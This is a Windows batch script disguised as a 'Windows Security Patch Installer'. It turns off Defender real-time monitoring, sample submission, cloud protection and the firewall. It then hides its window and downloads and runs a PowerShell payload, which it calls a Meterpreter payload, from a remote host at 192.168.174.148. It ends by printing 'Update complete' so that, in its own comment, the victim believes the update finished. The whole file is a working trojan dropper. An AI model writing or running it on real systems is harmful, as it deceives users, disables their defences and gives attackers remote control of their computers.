@echo off
title Windows Security Patch Installer
echo Installing critical security updates. Please wait...

:: 1. Disable Real-time Protection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: 2. Disable Sample Submission
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"

:: 3. Disable Cloud Protection
powershell -Command "Set-MpPreference -MAPSReporting Disable"

:: 4. Disable Firewall (Adding a slight delay so it doesn't prompt errors)
timeout /t 2 /nobreak >nul
netsh advfirewall set allprofiles state off

:: 5. Download and Execute your Meterpreter payload silently
echo Downloading patch components...
powershell -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.174.148:8080/payload.ps1')"

:: 6. Close the window so the victim thinks it's done
echo Update complete.
timeout /t 3 /nobreak >nul
exit

